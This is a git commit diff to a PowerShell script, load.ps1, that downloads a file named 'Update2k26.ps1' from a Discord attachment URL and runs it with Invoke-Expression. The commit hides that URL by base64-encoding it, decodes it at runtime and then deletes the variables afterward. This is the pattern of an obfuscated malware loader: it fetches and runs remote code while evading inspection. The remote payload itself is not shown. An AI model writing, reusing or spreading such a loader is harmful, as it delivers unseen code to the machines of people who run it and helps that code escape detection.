38d8f94179872fbb847580a05d3f9d111bed8b89
phattarakornyindee-beep <phattarakornyindee@gmail.com>
2026-07-13 22:40:10 +0700

    loaddSs.ps1

--- load.ps1
+++ load.ps1
@@ -1,4 +1,6 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$CoreLink = "https://cdn.discordapp.com/attachments/1526244895638159441/1526245370005422160/Update2k26.ps1?ex=6a565244&is=6a5500c4&hm=faad59a6c5f9f136ed085e122a3b8e6720960780bb80cab21e8c7b2c52f3262c&"
+$b64 = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTUyNjI0NDg5NTYzODE1OTQ0MS8xNTI2MjQ1MzcwMDA1NDIyMTYwL1VwZGF0ZTJrMjYucHMxP2V4PTZhNTY1MjQ0JmlzPTZhNTUwMGM0JmhtPWZhYWQ1OWE2YzVmOWYxMzZlZDA4NWUxMmEyM2I4ZTY3MjA5NjA3ODBiYjgwY2FiMjFlOGM3YjJjNTJmMzI2MmMm"
+$CoreLink = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
 $code = Invoke-RestMethod -Uri $CoreLink -UseBasicParsing
+Remove-Variable b64, CoreLink -ErrorAction SilentlyContinue
 Invoke-Expression $code
